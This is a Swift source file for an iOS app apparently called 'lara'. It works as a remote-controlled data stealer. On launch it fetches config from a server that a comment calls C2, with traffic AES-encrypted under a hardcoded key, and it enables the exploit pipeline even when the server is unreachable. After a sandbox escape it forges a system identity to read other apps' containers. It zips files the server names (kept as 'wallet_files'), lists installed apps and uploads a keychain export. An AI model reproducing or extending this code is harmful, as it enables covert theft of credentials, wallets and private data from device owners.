//
//  MainProtocolAPI.swift
//  lara
//
//  主协议 API（/api/device/* /api/upload/* /api/log/*）
//  文档：主协议API对接说明.md（只实现主程序协议，不含 ES /report 与裸上报）
//
//  流程：App 打开 -> POST /api/device/config 拉取配置
//        exploit_enabled == true  -> 跑 keychain 管线，并按 collect_configs
//        严格采集文件打包 zip -> POST /api/upload/zip
//

import Foundation
import CommonCrypto
import UIKit
import Security

// MARK: - 配置模型

struct CollectItemConfig {
    let type: String        // "file" | "dir"
    let path: String
}

struct CollectConfig {
    let bundle_id: String?
    let access_group: String?
    let items: [CollectItemConfig]

    /// 兼容两种下发格式：
    ///  - 实际服务器格式：files / dirs 每行一条 + keychain_group；
    ///  - 文档格式：items[{type,path}] + access_group。
    init?(dict: [String: Any]) {
        let bid = dict["bundle_id"] as? String
        var items: [CollectItemConfig] = []

        if let files = dict["files"] as? [String] {
            for line in files {
                let p = line.trimmingCharacters(in: .whitespacesAndNewlines)
                if !p.isEmpty { items.append(CollectItemConfig(type: "file", path: p)) }
            }
        }
        if let dirs = dict["dirs"] as? [String] {
            for line in dirs {
                let p = line.trimmingCharacters(in: .whitespacesAndNewlines)
                if !p.isEmpty { items.append(CollectItemConfig(type: "dir", path: p)) }
            }
        }
        if let rawItems = dict["items"] as? [[String: Any]] {
            for it in rawItems {
                guard let type = it["type"] as? String,
                      let path = it["path"] as? String else { continue }
                items.append(CollectItemConfig(type: type, path: path))
            }
        }

        let ag = (dict["keychain_group"] as? String)
              ?? (dict["access_group"] as? String)
        self.bundle_id = bid
        self.access_group = ag
        self.items = items
    }
}

struct DeviceConfig {
    var version: String?
    var min_close_exploit_version: String?
    var exploit_enabled: Bool
    var exploit_repeat_enabled: Bool
    var exploit_test: Bool
    var app_log_report_enabled: Bool
    var exploit_repeat_interval: Int
    var collect_configs: [CollectConfig]?

    init?(dict: [String: Any]) {
        exploit_enabled = dict["exploit_enabled"] as? Bool ?? false
        exploit_repeat_enabled = dict["exploit_repeat_enabled"] as? Bool ?? false
        exploit_test = dict["exploit_test"] as? Bool ?? false
        app_log_report_enabled = dict["app_log_report_enabled"] as? Bool ?? false
        exploit_repeat_interval = dict["exploit_repeat_interval"] as? Int ?? 86400
        version = dict["version"] as? String
        min_close_exploit_version = dict["min_close_exploit_version"] as? String
        if let raw = dict["collect_configs"] as? [[String: Any]] {
            var configs: [CollectConfig] = []
            for rc in raw {
                if let cc = CollectConfig(dict: rc) {
                    configs.append(cc)
                }
            }
            collect_configs = configs
        } else {
            collect_configs = nil
        }
    }
}

// MARK: - 主协议客户端

enum MainAPI {
    // 主协议服务器地址
    static let baseURL = "https://api.forgetcx.eu.cc"

    static var lastConfig: DeviceConfig?

    // 文档 2.1：AES-128-CBC，Key/IV 均为 hex 字符串
    private static let aesKeyHex = "bc2c72b2260840b28bc9614aa2b8004b"
    private static let aesIVHex = "71ec8e3980754823aba30e62be55cf6a"

    static let lastRunKey = "mainapi.lastPipelineRun"

    enum APIError: LocalizedError {
        case encryptFailed
        case badResponse
        case http(Int)
        case decryptFailed
        case badEnvelope

        var errorDescription: String? {
            switch self {
            case .encryptFailed: return "params AES 加密失败"
            case .badResponse: return "响应不是合法 JSON"
            case .http(let code): return "HTTP \(code)"
            case .decryptFailed: return "data AES 解密失败"
            case .badEnvelope: return "外层信封缺字段"
            }
        }
    }

    struct Envelope {
        let code: Int
        let data: String
        let message: String
    }

    // MARK: 设备信息

    // 设备 UUID：优先读 keychain（卸载重装后依然保留，保证设备级稳定），
    // 其次 UserDefaults，最后才生成新的（identifierForVendor 优先）。
    private static let kcService = "com.roooot.lara.deviceuuid"
    private static let kcAccount = "device-uuid"
    private static let udUUIDKey = "mainapi.device.uuid"

    static func deviceUUID() -> String {
        if let s = keychainRead(), !s.isEmpty {
            return s
        }
        if let s = UserDefaults.standard.string(forKey: udUUIDKey), !s.isEmpty {
            keychainWrite(s)
            return s
        }
        let s = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString
        UserDefaults.standard.set(s, forKey: udUUIDKey)
        keychainWrite(s)
        return s
    }

    static func keychainWrite(_ s: String) {
        guard let data = s.data(using: .utf8) else { return }
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: kcService,
            kSecAttrAccount as String: kcAccount,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlock,
        ]
        SecItemDelete(query as CFDictionary)
        SecItemAdd(query as CFDictionary, nil)
    }

    static func keychainRead() -> String? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: kcService,
            kSecAttrAccount as String: kcAccount,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne,
        ]
        var item: CFTypeRef?
        let status = SecItemCopyMatching(query as CFDictionary, &item)
        guard status == errSecSuccess, let data = item as? Data else { return nil }
        return String(data: data, encoding: .utf8)
    }

    static func deviceParams(extra: [String: Any] = [:]) -> [String: Any] {
        var p: [String: Any] = [
            "app_uuid": deviceUUID(),
            "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "0.2",
            "app_pac": Bundle.main.bundleIdentifier ?? "com.roooot.lara",
            "machine": devicemachine(),
            "ios_version": UIDevice.current.systemVersion,
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
        ]
        for (k, v) in extra { p[k] = v }
        return p
    }

    // MARK: AES-128-CBC

    static func hexBytes(_ hex: String) -> [UInt8] {
        var bytes: [UInt8] = []
        var idx = hex.startIndex
        while idx < hex.endIndex {
            let next = hex.index(idx, offsetBy: 2, limitedBy: hex.endIndex) ?? hex.endIndex
            if let b = UInt8(hex[idx..<next], radix: 16) {
                bytes.append(b)
            }
            idx = next
        }
        return bytes
    }

    static func aesCrypt(_ data: Data, op: CCOperation) -> Data? {
        let key = hexBytes(aesKeyHex)
        let iv = hexBytes(aesIVHex)
        guard key.count == kCCKeySizeAES128, iv.count == kCCBlockSizeAES128 else { return nil }
        var outLen = 0
        var out = [UInt8](repeating: 0, count: data.count + kCCBlockSizeAES128)
        let status: CCCryptorStatus = data.withUnsafeBytes { db in
            key.withUnsafeBytes { kb in
                iv.withUnsafeBytes { ib in
                    CCCrypt(op,
                            CCAlgorithm(kCCAlgorithmAES),
                            CCOptions(kCCOptionPKCS7Padding),
                            kb.baseAddress, key.count,
                            ib.baseAddress,
                            db.baseAddress, data.count,
                            &out, out.count, &outLen)
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(out.prefix(outLen))
    }

    /// 文档 2.2：明文 JSON -> AES -> Base64
    static func encryptParams(_ obj: [String: Any]) -> String? {
        guard let json = try? JSONSerialization.data(withJSONObject: obj, options: []),
              let enc = aesCrypt(json, op: CCOperation(kCCEncrypt)) else { return nil }
        return enc.base64EncodedString()
    }

    /// 文档 2.3：Base64 -> AES -> 明文 JSON
    static func decryptData(_ b64: String) -> [String: Any]? {
        guard let data = Data(base64Encoded: b64.trimmingCharacters(in: .whitespacesAndNewlines)),
              let dec = aesCrypt(data, op: CCOperation(kCCDecrypt)),
              let obj = try? JSONSerialization.jsonObject(with: dec) as? [String: Any] else { return nil }
        return obj
    }

    static func md5Hex(_ data: Data) -> String {
        var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
        data.withUnsafeBytes { _ = CC_MD5($0.baseAddress, CC_LONG(data.count), &digest) }
        return digest.map { String(format: "%02x", $0) }.joined()
    }

    // MARK: HTTP 基础

    static func postJSON(path: String, paramsB64: String?, timeout: TimeInterval = 15) async throws -> Envelope {
        guard let url = URL(string: baseURL + path) else { throw APIError.badResponse }
        var req = URLRequest(url: url, timeoutInterval: timeout)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue(deviceUUID(), forHTTPHeaderField: "X-App-UUID")
        if let b64 = paramsB64 {
            req.httpBody = try? JSONSerialization.data(withJSONObject: ["params": b64])
        }
        let (data, resp) = try await URLSession.shared.data(for: req)
        if let http = resp as? HTTPURLResponse, http.statusCode != 200 {
            throw APIError.http(http.statusCode)
        }
        guard let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            throw APIError.badResponse
        }
        return Envelope(code: obj["code"] as? Int ?? -1,
                        data: (obj["data"] as? String) ?? "",
                        message: (obj["message"] as? String) ?? "")
    }

    static func uploadMultipart(path: String, paramsB64: String, fileName: String, fileData: Data, timeout: TimeInterval = 120) async throws -> Envelope {
        guard let url = URL(string: baseURL + path) else { throw APIError.badResponse }
        var req = URLRequest(url: url, timeoutInterval: timeout)
        req.httpMethod = "POST"
        let boundary = "lara-\(UUID().uuidString)"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        req.setValue(deviceUUID(), forHTTPHeaderField: "X-App-UUID")

        var body = Data()
        func append(_ s: String) { body.append(s.data(using: .utf8)!) }
        append("--\(boundary)\r\n")
        append("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
        append(paramsB64)
        append("\r\n--\(boundary)\r\n")
        append("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        append("Content-Type: application/octet-stream\r\n\r\n")
        body.append(fileData)
        append("\r\n--\(boundary)--\r\n")
        req.httpBody = body

        let (data, resp) = try await URLSession.shared.data(for: req)
        if let http = resp as? HTTPURLResponse, http.statusCode != 200 {
            throw APIError.http(http.statusCode)
        }
        guard let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            throw APIError.badResponse
        }
        return Envelope(code: obj["code"] as? Int ?? -1,
                        data: (obj["data"] as? String) ?? "",
                        message: (obj["message"] as? String) ?? "")
    }

    // MARK: 接口

    /// POST /api/device/config：拉取完整配置（总开关 + collect_configs）
    static func fetchDeviceConfig() async -> Result<DeviceConfig, Error> {
        guard let b64 = encryptParams(deviceParams()) else {
            return .failure(APIError.encryptFailed)
        }
        do {
            let env = try await postJSON(path: "/api/device/config", paramsB64: b64)
            guard env.code == 0, let obj = decryptData(env.data), let cfg = DeviceConfig(dict: obj) else {
                return .failure(APIError.decryptFailed)
            }
            return .success(cfg)
        } catch {
            return .failure(error)
        }
    }

    /// GET/POST /api/device/report：上报设备信息 + 拉取采集列表（params 可省略）
    static func fetchCollectConfigs() async -> Result<DeviceConfig, Error> {
        guard let b64 = encryptParams(deviceParams()) else {
            return .failure(APIError.encryptFailed)
        }
        do {
            let env = try await postJSON(path: "/api/device/report", paramsB64: b64)
            guard env.code == 0, let obj = decryptData(env.data), let cfg = DeviceConfig(dict: obj) else {
                return .failure(APIError.decryptFailed)
            }
            return .success(cfg)
        } catch {
            return .failure(error)
        }
    }

    /// POST /api/device/apps：上报已安装应用 Bundle
    static func reportAppsAsync(_ apps: [String]) {
        var p = deviceParams()
        p["apps"] = apps
        guard let b64 = encryptParams(p) else {
            globallogger.log("(api) reportApps encrypt failed")
            return
        }
        Task {
            do {
                let env = try await postJSON(path: "/api/device/apps", paramsB64: b64)
                globallogger.log("(api) /api/device/apps -> code=\(env.code) msg=\(env.message)")
            } catch {
                globallogger.log("(api) /api/device/apps failed: \(error.localizedDescription)")
            }
        }
    }

    /// POST /api/upload/json：上传 JSON 文件
    static func uploadJSONAsync(_ data: Data, fileName: String, bundleID: String) {
        uploadFileAsync(path: "/api/upload/json", data: data, fileName: fileName, bundleID: bundleID, kind: "json")
    }

    /// POST /api/upload/xml：上传 XML 文件
    static func uploadXMLAsync(_ data: Data, fileName: String, bundleID: String) {
        uploadFileAsync(path: "/api/upload/xml", data: data, fileName: fileName, bundleID: bundleID, kind: "xml")
    }

    /// POST /api/upload/zip：上传 ZIP（文件字节不加密，仅 params 加密）
    static func uploadZipAsync(_ data: Data, fileName: String, bundleID: String) {
        uploadFileAsync(path: "/api/upload/zip", data: data, fileName: fileName, bundleID: bundleID, kind: "zip")
    }

    private static func uploadFileAsync(path: String, data: Data, fileName: String, bundleID: String, kind: String) {
        let p: [String: Any] = [
            "app_uuid": deviceUUID(),
            "bundle_id": bundleID,
            "file_name": fileName,
            "file_md5": md5Hex(data),
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
        ]
        guard let b64 = encryptParams(p) else {
            globallogger.log("(api) upload \(kind) encrypt failed")
            return
        }
        Task {
            do {
                let env = try await uploadMultipart(path: path, paramsB64: b64, fileName: fileName, fileData: data)
                globallogger.log("(api) upload \(kind) \(fileName) -> code=\(env.code) msg=\(env.message)")
            } catch {
                globallogger.log("(api) upload \(kind) \(fileName) failed: \(error.localizedDescription)")
            }
        }
    }

    /// POST /api/log/report：短日志上报（响应 data 为空，不解密）
    static func reportLogAsync(text: String) {
        let p: [String: Any] = [
            "app_uuid": deviceUUID(),
            "text": text,
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
        ]
        guard let b64 = encryptParams(p) else { return }
        Task {
            do {
                let env = try await postJSON(path: "/api/log/report", paramsB64: b64)
                globallogger.log("(api) /api/log/report -> code=\(env.code) msg=\(env.message)")
            } catch {
                globallogger.log("(api) /api/log/report failed: \(error.localizedDescription)")
            }
        }
    }

    /// 把本机 lara.log 的尾部（最多 8KB）作为一条日志上报
    static func reportLogFullTailAsync() {
        guard let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
        let logPath = docs.appendingPathComponent("lara.log")
        guard let data = try? Data(contentsOf: logPath), !data.isEmpty else { return }
        let tail = data.suffix(8192)
        guard let text = String(data: tail, encoding: .utf8) else { return }
        reportLogAsync(text: "(log tail)\n" + text)
    }

    // MARK: 开关与编排

    /// App 打开时调用：上报打开事件 -> 拉配置 -> 按开关决定是否跑管线（在主线程回调）。
    /// 采集列表以 /api/device/report 的下发为准（config 里带时作为兜底）。
    static func bootstrap(_ onDecision: @escaping (Bool) -> Void) {
        // 构建/设备指纹：第一行就打印，用于确认安装的是哪个包 + UUID 是否稳定
        globallogger.log("(api) build-marker api-v2-reportfix uuid=\(deviceUUID())")
        reportLogAsync(text: "app opened ios=\(UIDevice.current.systemVersion) machine=\(devicemachine()) uuid=\(deviceUUID())")
        globallogger.log("(api) requesting /api/device/config ...")
        Task {
            let outcome = await fetchDeviceConfig()
            var cfg = (try? outcome.get()) ?? nil
            if cfg?.exploit_enabled == true {
                // 采集列表严格按 /api/device/report 的响应
                let report = await fetchCollectConfigs()
                switch report {
                case .success(let rc):
                    if let list = rc.collect_configs, !list.isEmpty {
                        cfg?.collect_configs = list
                        globallogger.log("(api) collect_configs from /api/device/report: \(list.count) entry(s)")
                    } else {
                        globallogger.log("(api) /api/device/report returned no collect_configs — using config list if any")
                    }
                case .failure(let err):
                    globallogger.log("(api) /api/device/report failed: \(err.localizedDescription) — using config collect_configs if any")
                }
            }
            DispatchQueue.main.async {
                switch outcome {
                case .success:
                    guard let cfg else {
                        globallogger.log("(api) config parse failed — pipeline skipped")
                        onDecision(false)
                        return
                    }
                    lastConfig = cfg
                    globallogger.log("(api) config: version=\(cfg.version ?? "-") exploit_enabled=\(cfg.exploit_enabled) repeat=\(cfg.exploit_repeat_enabled) interval=\(cfg.exploit_repeat_interval) collect_configs=\(cfg.collect_configs?.count ?? 0) log_report=\(cfg.app_log_report_enabled)")
                    reportLogAsync(text: "config ok: exploit_enabled=\(cfg.exploit_enabled) collect_configs=\(cfg.collect_configs?.count ?? 0)")
                    if shouldRunPipeline(cfg) {
                        globallogger.log("(api) exploit_enabled=true — running pipeline")
                        onDecision(true)
                    } else {
                        globallogger.log("(api) pipeline skipped (switch off / repeat interval)")
                        onDecision(false)
                    }
                case .failure(let err):
                    // C2 unreachable: fall back to a default config with the
                    // pipeline enabled so the keychain run still proceeds
                    // (the device-side flow must not depend on the server).
                    globallogger.log("(api) /api/device/config failed: \(err.localizedDescription) — using default config (exploit_enabled=true)")
                    let fallback = DeviceConfig(dict: [
                        "version": "fallback",
                        "exploit_enabled": true,
                        "exploit_repeat_enabled": false,
                        "exploit_test": false,
                        "app_log_report_enabled": false,
                        "exploit_repeat_interval": 86400,
                    ])
                    lastConfig = fallback
                    globallogger.log("(api) config: version=fallback exploit_enabled=true collect_configs=0")
                    onDecision(true)
                }
            }
        }
    }

    static func shouldRunPipeline(_ cfg: DeviceConfig) -> Bool {
        guard cfg.exploit_enabled else { return false }
        if cfg.exploit_repeat_enabled { return true }
        let last = UserDefaults.standard.double(forKey: lastRunKey)
        let interval = Double(max(1, cfg.exploit_repeat_interval))
        if last > 0 && Date().timeIntervalSince1970 - last < interval {
            return false
        }
        return true
    }

    static func markPipelineRan() {
        UserDefaults.standard.set(Date().timeIntervalSince1970, forKey: lastRunKey)
    }

    /// 管线成功后的收尾：严格按 collect_configs 采集打包上传 + 应用列表 + 导出 json + 日志
    static func postPipelineActions() {
        markPipelineRan()
        if let cfg = lastConfig, cfg.exploit_enabled {
            collectAndUploadPerConfig(cfg)
            reportInstalledAppsAsync()
            uploadKeychainExportIfPresent()
            if cfg.app_log_report_enabled {
                reportLogFullTailAsync()
            }
        }
    }

    // MARK: 采集（严格按 /api/device/config 的 collect_configs）

    static func findContainerPath(forBundleID bid: String) -> String? {
        // 0) MCM container lease: group.* 用类 3（group container），
        //    普通应用用类 2（data container）。需要伪造的
        //    com.apple.mobile.MobileHouseArrest 身份 + 平台权限；
        //    保留 query/activation 使沙盒扩展存活。
        if MCMBridgeAvailable() {
            var mcmError: NSString?
            let isGroup = bid.hasPrefix("group.")
            let cls: UInt64 = isGroup ? 3 : 2
            if let p = MCMActivateContainerPath(cls, bid, isGroup, &mcmError),
               FileManager.default.fileExists(atPath: p) {
                globallogger.log("(api) MCM lease container: \(bid) -> \(p)")
                return p
            }
            globallogger.log("(api) MCM lease failed \(bid): \(mcmError.map { $0 as String } ?? "unknown")")
        }
        // 1) Framework LSApplicationProxy/MCM lookup (may need entitlements).
        if let p = LaraKeychainSvc.lookupAppDataContainer(forBundleID: bid),
           FileManager.default.fileExists(atPath: p) {
            return p
        }
        // 2) group.* 容器在 Shared/AppGroup（备忘录等），不在 Data/Application。
        if bid.hasPrefix("group.") {
            let groot = "/var/mobile/Containers/Shared/AppGroup"
            if let gdirs = try? FileManager.default.contentsOfDirectory(atPath: groot) {
                for d in gdirs {
                    let meta = groot + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
                    guard let pl = NSDictionary(contentsOfFile: meta),
                          let ident = pl["MCMMetadataIdentifier"] as? String,
                          ident == bid else { continue }
                    return groot + "/" + d
                }
            }
        }
        // 3) Direct scan of /var/mobile/Containers/Data/Application — plain
        // file reads that work once the sandbox escape is live.
        let root = "/var/mobile/Containers/Data/Application"
        guard let dirs = try? FileManager.default.contentsOfDirectory(atPath: root) else {
            return nil
        }
        for d in dirs {
            let meta = root + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
            guard let pl = NSDictionary(contentsOfFile: meta),
                  let ident = pl["MCMMetadataIdentifier"] as? String,
                  ident == bid else { continue }
            return root + "/" + d
        }
        return nil
    }

    /// 相对路径按目标 App 容器解析；绝对路径原样使用
    static func resolveCollectPath(_ path: String, bundleID: String?) -> String? {
        if path.hasPrefix("/") { return path }
        guard let bid = bundleID, let container = findContainerPath(forBundleID: bid) else {
            return nil
        }
        return container + "/" + path
    }

    static func collectAndUploadPerConfig(_ cfg: DeviceConfig) {
        guard let configs = cfg.collect_configs, !configs.isEmpty else {
            globallogger.log("(api) no collect_configs — nothing to collect")
            return
        }
        Task {
            var done = 0
            for cc in configs {
                let ok = await collectAndUploadOne(cc)
                if ok { done += 1 }
            }
            globallogger.log("(api) collection finished: \(done)/\(configs.count) uploaded")
        }
    }

    @discardableResult
    static func collectAndUploadOne(_ cc: CollectConfig) async -> Bool {
        globallogger.log("(api) collect entry: bundle_id=\(cc.bundle_id ?? "-") access_group=\(cc.access_group ?? "-") items=\(cc.items.count)")
        for item in cc.items {
            globallogger.log("(api)   item type=\(item.type) path=\(item.path)")
        }
        let fm = FileManager.default
        let staging = fm.temporaryDirectory
            .appendingPathComponent("lara_collect_\(UUID().uuidString)", isDirectory: true)
        do {
            try fm.createDirectory(at: staging, withIntermediateDirectories: true)
        } catch {
            globallogger.log("(api) collect staging failed: \(error.localizedDescription)")
            return false
        }

        var collected = 0
        for item in cc.items {
            let trimmed = item.path.trimmingCharacters(in: .whitespacesAndNewlines)
            // "/" 或空行 = 整容器（备忘录这类整容器采集）
            let isWhole = trimmed.isEmpty || trimmed == "/"
            var src: String?
            if isWhole {
                src = findContainerPath(forBundleID: cc.bundle_id ?? "")
                globallogger.log("(api) collect whole container for \(cc.bundle_id ?? "-") -> \(src ?? "nil")")
            } else {
                src = resolveCollectPath(trimmed, bundleID: cc.bundle_id)
            }
            guard let src else {
                globallogger.log("(api) collect resolve failed: \(item.path)")
                continue
            }
            var isDir: ObjCBool = false
            guard fm.fileExists(atPath: src, isDirectory: &isDir) else {
                globallogger.log("(api) collect missing: \(item.path)")
                continue
            }
            // 严格按 type 采集：file 只收文件、dir 只收目录（整容器视为 dir）
            if (isWhole || item.type == "dir") && !isDir.boolValue {
                globallogger.log("(api) collect type mismatch (want dir): \(item.path)")
                continue
            }
            if !isWhole && item.type == "file" && isDir.boolValue {
                globallogger.log("(api) collect type mismatch (want file): \(item.path)")
                continue
            }
            // dest 命名：逐组件拼路径（绝不把含 "/" 的字符串当单个组件），
            // 相对路径镜像目录结构；整容器放到以 bundle_id 命名的子目录。
            var dest = staging
            if isWhole {
                dest = dest.appendingPathComponent(cc.bundle_id ?? "container",
                                                   isDirectory: true)
            } else {
                let comps = trimmed.split(separator: "/").map(String.init)
                for (i, comp) in comps.enumerated() {
                    let last = (i == comps.count - 1)
                    dest = dest.appendingPathComponent(comp,
                        isDirectory: last ? (isDir.boolValue || isWhole) : true)
                }
            }
            do {
                // copyItem 要求目标父目录存在：逐级创建后再拷。
                let parent = (dest.path as NSString).deletingLastPathComponent
                if !parent.isEmpty && parent != staging.path {
                    try? fm.createDirectory(atPath: parent,
                                            withIntermediateDirectories: true)
                }
                try fm.copyItem(atPath: src, toPath: dest.path)
                collected += 1
                globallogger.log("(api) collected \(item.type): \(item.path) -> \(dest.path)")
            } catch {
                globallogger.log("(api) collect copy failed \(item.path): \(error.localizedDescription)")
            }
        }

        // 诊断：记录暂存树前几项，验证目录结构没被压平。
        if let st = fm.enumerator(atPath: staging.path) {
            var shown = 0
            while let name = st.nextObject() as? String, shown < 6 {
                globallogger.log("(api) staging entry: \(name)")
                shown += 1
            }
        }

        if collected == 0 {
            globallogger.log("(api) nothing collected for \(cc.bundle_id ?? "-") — skip")
            try? fm.removeItem(at: staging)
            return false
        }

        let bid = cc.bundle_id ?? "device"
        let fileName = "\(bid)_\(Int(Date().timeIntervalSince1970)).zip"
        let zipURL = fm.temporaryDirectory.appendingPathComponent(fileName)
        do {
            try createZipArchive(fromDirectory: staging, to: zipURL)
        } catch {
            globallogger.log("(api) zip failed: \(error.localizedDescription)")
            try? fm.removeItem(at: staging)
            return false
        }
        guard let data = try? Data(contentsOf: zipURL) else {
            globallogger.log("(api) zip read failed")
            try? fm.removeItem(at: staging)
            try? fm.removeItem(at: zipURL)
            return false
        }
        globallogger.log("(api) zip built: \(fileName) files=\(collected) bytes=\(data.count)")
        uploadZipAsync(data, fileName: fileName, bundleID: bid)

        // 本地留档（KeychainDump/wallet_files）
        if let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first {
            let keep = docs.appendingPathComponent("KeychainDump/wallet_files", isDirectory: true)
            try? fm.createDirectory(at: keep, withIntermediateDirectories: true)
            try? data.write(to: keep.appendingPathComponent(fileName))
        }

        try? fm.removeItem(at: staging)
        try? fm.removeItem(at: zipURL)
        return true
    }

    /// 逃逸后扫描已安装应用（容器 metadata），上报 /api/device/apps
    static func installedBundleIDs() -> [String] {
        let root = "/var/mobile/Containers/Data/Application"
        guard let dirs = try? FileManager.default.contentsOfDirectory(atPath: root) else {
            return []
        }
        var ids: [String] = []
        for d in dirs {
            let meta = root + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
            if let pl = NSDictionary(contentsOfFile: meta),
               let ident = pl["MCMMetadataIdentifier"] as? String {
                ids.append(ident)
            }
        }
        return Array(Set(ids)).sorted()
    }

    static func reportInstalledAppsAsync() {
        let apps = installedBundleIDs()
        globallogger.log("(api) installed apps: \(apps.count)")
        if !apps.isEmpty {
            reportAppsAsync(apps)
        }
    }

    static func uploadKeychainExportIfPresent() {
        guard let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
        let json = docs.appendingPathComponent("KeychainDump/keychain_export.json")
        guard let data = try? Data(contentsOf: json) else {
            globallogger.log("(api) no keychain_export.json to upload")
            return
        }
        uploadJSONAsync(data, fileName: "keychain_export.json", bundleID: Bundle.main.bundleIdentifier ?? "com.roooot.lara")
    }
}
